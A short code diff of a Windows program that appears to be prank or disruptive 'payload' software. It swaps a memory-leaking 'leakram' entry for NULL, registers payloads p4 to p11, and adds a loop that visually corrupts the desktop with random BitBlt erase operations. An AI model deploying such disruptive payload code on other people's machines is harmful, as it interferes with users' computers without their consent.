@@ -66,10 +66,18 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     }
 
     functionarray payloads[] = {
-        leakram,
+        NULL,
         p1,
         p2,
-        p3
+        p3,
+        p4,
+        p5,
+        p6,
+        p7,
+        p8,
+        p9,
+        p10,
+        p11
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
     
     DWORD zero = 0;
@@ -220,6 +228,13 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         PatBlt(desk, 0, 0, sw, h, desk, PATINVERT);
         Sleep(50);
     }
+
+    //Corrupting the desktop
+    fori(100) {
+        BitBlt(desk, rand() % w, rand() % h, rand() % w, rand() % h, desk, rand() % w, rand() % h, SRCERASE);
+        Sleep(50);
+    }
+    
 
     ReleaseDC(NULL, desk);
     ReleaseDC(NULL, hHDC);
